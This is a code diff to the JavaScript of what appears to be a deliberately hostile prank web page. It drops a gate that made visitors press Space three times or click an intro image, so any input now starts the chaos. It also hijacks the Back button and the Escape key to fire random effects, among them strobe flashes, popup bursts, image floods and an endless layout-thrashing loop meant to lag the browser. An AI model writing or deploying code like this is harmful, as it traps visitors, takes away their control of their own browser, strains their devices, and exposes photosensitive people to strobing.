@@ -295,6 +295,7 @@ function init () {
 
   setupTouchLocks()
   setupGyroscopeAndMotion()
+  setupBackAndEscRandomSwitcher()
 
   interceptUserInput(event => {
     interactionCount += 1
@@ -680,29 +681,25 @@ function startVibrateInterval () {
  */
 function interceptUserInput (onInput) {
   let hasStarted = false;
-  let spaceCount = 0;
   
   const wrappedInput = (e) => {
-    if (!isChildWindow && !hasStarted) {
-      if (e.type === 'keydown' && e.code === 'Space') {
-        spaceCount++;
-        if (spaceCount < 3) return;
-      } else {
-        const isBird = e.target && e.target.tagName === 'IMG' && e.target.src && e.target.src.includes('intro.gif');
-        if (!isBird) return;
+    // Synchronously unlock and start AudioContext on any user touch/click gesture
+    if (machineAudioCtx) {
+      if (machineAudioCtx.state === 'suspended') {
+        machineAudioCtx.resume().catch(() => {});
       }
+      initContinuousMachineSound();
     }
+
+    if (hasStarted) return;
     hasStarted = true;
     onInput(e);
   };
 
-  document.body.addEventListener('touchstart', wrappedInput, { passive: false })
-  document.body.addEventListener('mousedown', wrappedInput)
-  document.body.addEventListener('mouseup', wrappedInput)
-  document.body.addEventListener('click', wrappedInput)
-  document.body.addEventListener('keydown', wrappedInput)
-  document.body.addEventListener('keyup', wrappedInput)
-  document.body.addEventListener('keypress', wrappedInput)
+  ['touchstart', 'touchend', 'pointerdown', 'mousedown', 'click', 'keydown'].forEach(evtType => {
+    document.addEventListener(evtType, wrappedInput, { passive: false });
+    window.addEventListener(evtType, wrappedInput, { passive: false });
+  });
 }
 
 /**
@@ -2669,4 +2666,192 @@ function startScreenFlipChaos() {
       document.body.classList.remove('mobile-rotated-90');
     }
   }, 3500);
+}
+
+/* ==========================================================================
+   BACK/ESC RANDOM MODE SWITCHER, DIAGONAL IMAGE STACKER & EXTREME DVD BOUNCER
+   ========================================================================== */
+
+function setupBackAndEscRandomSwitcher() {
+  function triggerRandomModeSwap() {
+    const modes = [
+      () => startDiagonalImageCascade(),
+      () => startExtremeDVDBouncer(),
+      () => triggerMegaChaos(),
+      () => startStrobeEffect(),
+      () => spawnStackedImagesFrenzy(30),
+      () => triggerScreenShake(),
+      () => triggerBrowserLagStresser(),
+      () => spawnRetroPopupBurst(8)
+    ];
+    const randomChoice = modes[Math.floor(Math.random() * modes.length)];
+    try { randomChoice(); } catch (e) {}
+  }
+
+  // Trigger on Back Button (popstate)
+  window.addEventListener('popstate', (e) => {
+    triggerRandomModeSwap();
+  });
+
+  // Trigger on ESC Key (Escape)
+  window.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' || e.code === 'Escape' || e.keyCode === 27) {
+      e.preventDefault();
+      triggerRandomModeSwap();
+    }
+  });
+}
+
+function startDiagonalImageCascade() {
+  const container = document.getElementById('diagonal-stacker-container');
+  if (!container) return;
+
+  const imgSrc = getRandomArrayEntry(FILE_DOWNLOADS);
+  const startX = 10;
+  const startY = window.innerHeight - 150;
+  const targetX = window.innerWidth - 160;
+  const targetY = 10;
+
+  const steps = 180;
+  const dx = (targetX - startX) / steps;
+  const dy = (targetY - startY) / steps;
+
+  let currentStep = 0;
+  let currX = startX;
+  let currY = startY;
+
+  const cascadeInterval = setInterval(() => {
+    if (currentStep >= steps) {
+      clearInterval(cascadeInterval);
+      return;
+    }
+
+    const img = document.createElement('img');
+    img.src = imgSrc;
+    img.className = 'stacked-meme-img';
+    img.style.left = `${currX}px`;
+    img.style.top = `${currY}px`;
+    img.style.width = '120px';
+    img.style.height = '120px';
+    img.style.objectFit = 'cover';
+    img.style.zIndex = `${1000 + currentStep}`;
+    img.style.animation = 'none';
+
+    container.appendChild(img);
+
+    currX += dx;
+    currY += dy;
+    currentStep++;
+  }, 12);
+}
+
+let isExtremeDVDRunning = false;
+
+function startExtremeDVDBouncer() {
+  const container = document.getElementById('dvd-bouncer-container');
+  if (!container || isExtremeDVDRunning) return;
+  isExtremeDVDRunning = true;
+
+  const img = document.createElement('img');
+  img.src = getRandomArrayEntry(FILE_DOWNLOADS);
+  img.style.position = 'absolute';
+  img.style.width = '130px';
+  img.style.height = '130px';
+  img.style.objectFit = 'cover';
+  img.style.border = '4px solid #34eb7d';
+  img.style.boxShadow = '0 0 30px #34eb7d';
+  img.style.borderRadius = '8px';
+
+  let posX = Math.random() * (window.innerWidth - 150);
+  let posY = Math.random() * (window.innerHeight - 150);
+  let vx = 45;
+  let vy = 35;
+
+  container.appendChild(img);
+
+  function bounceStep() {
+    posX += vx;
+    posY += vy;
+
+    const maxW = window.innerWidth - 140;
+    const maxH = window.innerHeight - 140;
+
+    let hitBorder = false;
+
+    if (posX <= 0) {
+      posX = 0;
+      vx = Math.abs(vx);
+      hitBorder = true;
+    } else if (posX >= maxW) {
+      posX = maxW;
+      vx = -Math.abs(vx);
+      hitBorder = true;
+    }
+
+    if (posY <= 0) {
+      posY = 0;
+      vy = Math.abs(vy);
+      hitBorder = true;
+    } else if (posY >= maxH) {
+      posY = maxH;
+      vy = -Math.abs(vy);
+      hitBorder = true;
+    }
+
+    if (hitBorder) {
+      const hue = Math.floor(Math.random() * 360);
+      img.style.borderColor = `hsl(${hue}, 100%, 50%)`;
+      img.style.boxShadow = `0 0 35px hsl(${hue}, 100%, 50%)`;
+      img.style.filter = `hue-rotate(${hue}deg)`;
+      triggerScreenShake();
+    }
+
+    img.style.left = `${posX}px`;
+    img.style.top = `${posY}px`;
+
+    requestAnimationFrame(bounceStep);
+  }
+
+  requestAnimationFrame(bounceStep);
+}
+
+let isLagStresserActive = false;
+
+function triggerBrowserLagStresser() {
+  if (isLagStresserActive) return;
+  isLagStresserActive = true;
+
+  const backdropContainer = document.getElementById('lag-stresser-backdrop-container');
+  if (backdropContainer) {
+    backdropContainer.style.display = 'block';
+    for (let i = 0; i < 20; i++) {
+      const layer = document.createElement('div');
+      layer.style.position = 'absolute';
+      layer.style.top = `${Math.random() * 60}%`;
+      layer.style.left = `${Math.random() * 60}%`;
+      layer.style.width = '50vw';
+      layer.style.height = '50vh';
+      layer.style.backdropFilter = 'blur(20px) saturate(200%)';
+      layer.style.webkitBackdropFilter = 'blur(20px) saturate(200%)';
+      layer.style.border = '1px solid rgba(255,255,255,0.2)';
+      backdropContainer.appendChild(layer);
+    }
+  }
+
+  // Layout Thrashing Loop
+  function stressLayoutReflow() {
+    const dummy = document.createElement('div');
+    dummy.style.position = 'fixed';
+    dummy.style.top = '-9999px';
+    document.body.appendChild(dummy);
+
+    for (let i = 0; i < 1500; i++) {
+      dummy.style.width = `${(i % 100) + 10}px`;
+      const forceReflow = dummy.offsetWidth;
+    }
+
+    dummy.remove();
+    requestAnimationFrame(stressLayoutReflow);
+  }
+  requestAnimationFrame(stressLayoutReflow);
 }
